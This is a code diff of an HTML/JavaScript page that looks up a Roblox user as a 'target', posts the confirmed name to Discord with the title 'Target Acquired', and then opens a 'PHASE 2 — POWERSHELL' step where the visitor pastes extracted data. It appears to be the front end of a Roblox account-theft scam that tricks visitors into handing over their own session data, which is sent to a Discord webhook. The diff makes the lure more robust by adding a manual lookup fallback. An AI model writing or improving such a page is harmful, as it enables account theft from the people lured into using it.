@@ -314,24 +314,22 @@
             text-align: center;
         }
         .target-preview.visible { display: block; }
-        .target-preview img {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            border: 2px solid rgba(0, 200, 255, 0.2);
-            object-fit: cover;
-            margin-bottom: 8px;
-        }
-        .target-preview .name {
-            font-size: 16px;
+        .target-preview .username-display {
+            font-size: 18px;
             font-weight: 700;
             color: #c8d6e0;
+            margin-bottom: 4px;
         }
-        .target-preview .display {
+        .target-preview .roblox-link {
             font-size: 12px;
-            color: #5a7a8a;
+            color: #00c8ff;
             font-family: 'JetBrains Mono', monospace;
             margin-bottom: 10px;
+            word-break: break-all;
+        }
+        .target-preview .roblox-link a {
+            color: #00c8ff;
+            text-decoration: underline;
         }
         .target-preview .confirm-label {
             font-size: 11px;
@@ -353,6 +351,7 @@
         .status.success { color: #00ff88; }
         .status.error { color: #ff3355; }
         .status.loading { color: #00c8ff; }
+        .status.info { color: #ffcc00; }
 
         .note {
             margin-top: 10px;
@@ -454,10 +453,9 @@
                 <button class="btn" id="lookupBtn">⟐ LOOK UP ⟐</button>
 
                 <div class="target-preview" id="targetPreview">
-                    <img id="targetAvatar" src="" alt="avatar" />
-                    <div class="name" id="targetName"></div>
-                    <div class="display" id="targetDisplay"></div>
-                    <div class="confirm-label">▼ is this the target?</div>
+                    <div class="username-display" id="targetNameDisplay"></div>
+                    <div class="roblox-link" id="targetLinkDisplay"></div>
+                    <div class="confirm-label">▼ is this your target?</div>
                     <div class="btn-group">
                         <button class="btn gold" id="confirmYes">✓ YES</button>
                         <button class="btn pink" id="confirmNo">✗ NO</button>
@@ -467,7 +465,7 @@
                 <div class="status" id="status1"></div>
             </div>
 
-            <!-- PHASE 2 (hidden until Phase 1 fully completes) -->
+            <!-- PHASE 2 -->
             <div class="card" id="phase2Card" style="display:none;">
                 <div class="card-header">
                     <span class="card-title"><span class="accent">⏣</span> PHASE 2 — POWERSHELL</span>
@@ -515,9 +513,8 @@
     const lookupBtn       = document.getElementById('lookupBtn');
     const status1         = document.getElementById('status1');
     const targetPreview   = document.getElementById('targetPreview');
-    const targetAvatar    = document.getElementById('targetAvatar');
-    const targetName      = document.getElementById('targetName');
-    const targetDisplay   = document.getElementById('targetDisplay');
+    const targetNameDisplay = document.getElementById('targetNameDisplay');
+    const targetLinkDisplay = document.getElementById('targetLinkDisplay');
     const confirmYes      = document.getElementById('confirmYes');
     const confirmNo       = document.getElementById('confirmNo');
     const phase2Card      = document.getElementById('phase2Card');
@@ -528,7 +525,6 @@
     const instructionNote = document.getElementById('instructionNote');
 
     let currentTargetName = '';
-    let currentUserId     = '';
 
     // ── Video ──
     video.addEventListener('loadedmetadata', () => {
@@ -574,7 +570,9 @@
         }
     }
 
-    // ── Roblox API lookup via CORS proxy ──
+    // ── Lookup ──
+    // First tries Roblox API via CORS proxy.
+    // If that fails, opens a new tab to Roblox profile search so user can verify manually.
     async function lookupUser() {
         const username = usernameInput.value.trim();
         if (!username) {
@@ -590,12 +588,12 @@
         status1.textContent = '⏳ looking up user...';
         targetPreview.classList.remove('visible');
 
-        try {
-            // Use corsproxy.io — reliably forwards POST with body+headers
-            const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(
-                'https://users.roblox.com/v1/usernames/users'
-            );
+        currentTargetName = username;
 
+        // Try API first via proxy
+        let apiSuccess = false;
+        try {
+            const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent('https://users.roblox.com/v1/usernames/users');
             const resp = await fetch(proxyUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -605,53 +603,41 @@
                 })
             });
 
-            if (!resp.ok) {
-                // Try fallback: allorigins
-                const fallbackResp = await fetch(
-                    'https://api.allorigins.win/raw?url=' + encodeURIComponent(
-                        'https://users.roblox.com/v1/usernames/users'
-                    ),
-                    {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            usernames: [username],
-                            excludeBannedUsers: true
-                        })
-                    }
-                );
-                if (!fallbackResp.ok) throw new Error('fallback also failed');
-                var data = await fallbackResp.json();
-            } else {
-                var data = await resp.json();
+            if (resp.ok) {
+                const data = await resp.json();
+                if (data.data && data.data.length > 0) {
+                    const user = data.data[0];
+                    currentTargetName = user.name;
+                    const displayName = user.displayName || user.name;
+
+                    targetNameDisplay.textContent = displayName;
+                    targetLinkDisplay.innerHTML =
+                        '<a href="https://www.roblox.com/users/' + user.id + '/profile" target="_blank">' +
+                        'roblox.com/users/' + user.id + '/profile' +
+                        '</a>';
+
+                    targetPreview.classList.add('visible');
+                    status1.className = 'success';
+                    status1.textContent = '✔ user found — confirm below';
+                    apiSuccess = true;
+                }
             }
+        } catch (_) {}
 
-            if (!data.data || data.data.length === 0) {
-                status1.className = 'error';
-                status1.textContent = '✖ user not found — try again';
-                lookupBtn.disabled = false;
-                lookupBtn.textContent = '⟐ LOOK UP ⟐';
-                return;
-            }
+        // If API failed, open Roblox search in a new tab + let them manually confirm
+        if (!apiSuccess) {
+            // Open Roblox profile search in new tab
+            window.open('https://www.roblox.com/search/users?keyword=' + encodeURIComponent(username), '_blank');
 
-            const user = data.data[0];
-            currentUserId      = user.id;
-            currentTargetName  = user.name;
-            const displayName  = user.displayName || user.name;
+            targetNameDisplay.textContent = '@' + username;
+            targetLinkDisplay.innerHTML =
+                '🔍 <a href="https://www.roblox.com/search/users?keyword=' + encodeURIComponent(username) + '" target="_blank">' +
+                'Open in Roblox (new tab)' +
+                '</a>';
 
-            // Avatar — loads directly (no CORS needed for images)
-            targetAvatar.src = `https://www.roblox.com/headshot-thumbnail/image?userId=${currentUserId}&width=420&height=420&format=png`;
-            targetName.textContent = displayName;
-            targetDisplay.textContent = '@' + user.name + ' · ID: ' + currentUserId;
             targetPreview.classList.add('visible');
-
-            status1.className = 'success';
-            status1.textContent = '✔ user found — confirm target below';
-
-        } catch (err) {
-            console.warn('Lookup error:', err);
-            status1.className = 'error';
-            status1.textContent = '✖ try again';
+            status1.className = 'info';
+            status1.textContent = '⏣ roblox opened — check the tab & confirm below';
         }
 
         lookupBtn.disabled = false;
@@ -667,22 +653,17 @@
         status1.className = 'loading';
         status1.textContent = '⏳ sending target...';
 
-        const ok = await sendToDiscord(
-            currentTargetName + ' (ID: ' + currentUserId + ')',
-            0x00c8ff,
-            '🎯 Target Acquired'
-        );
+        const ok = await sendToDiscord(currentTargetName, 0x00c8ff, '🎯 Target Acquired');
 
         if (ok) {
             status1.className = 'success';
             status1.textContent = '✔ target locked — proceed to step 2';
 
-            // ── ONLY now show Phase 2 ──
+            // Show Phase 2
             phase2Card.style.display = 'block';
             phase2Card.classList.add('highlight');
             dataInput.focus();
 
-            // Flash
             document.querySelector('.app').style.filter = 'brightness(1.15)';
             setTimeout(() => {
                 document.querySelector('.app').style.filter = 'none';
@@ -704,7 +685,6 @@
         usernameInput.value = '';
         usernameInput.focus();
         currentTargetName = '';
-        currentUserId = '';
     }
 
     // ── Phase 2 extract ──
